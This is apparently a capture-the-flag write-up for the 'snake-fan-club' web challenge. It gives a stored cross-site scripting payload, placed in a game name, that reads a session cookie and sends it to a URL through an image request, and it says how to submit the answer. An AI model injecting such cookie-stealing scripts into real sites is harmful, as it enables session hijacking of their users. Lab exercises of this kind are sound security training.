Open <https://snake-fan-club.chall.necst.it> and create an account.

Then create a new game with the given name :
```js
<script>const m=document.cookie.match(/[cookie]=([^;]+)/)[1];if(m){new Image().src='https://chall.necst.it/challenges/snake-fan-club/verify/<number>/'+encodeURIComponent(m);}</script>
```

Where `[cookie]` is the given cookie name (e.g., `NdefZm`) and `<number>` is the given number in the GET request (e.g `288`).

Finally, the answer to submit is the URL of the game you created.
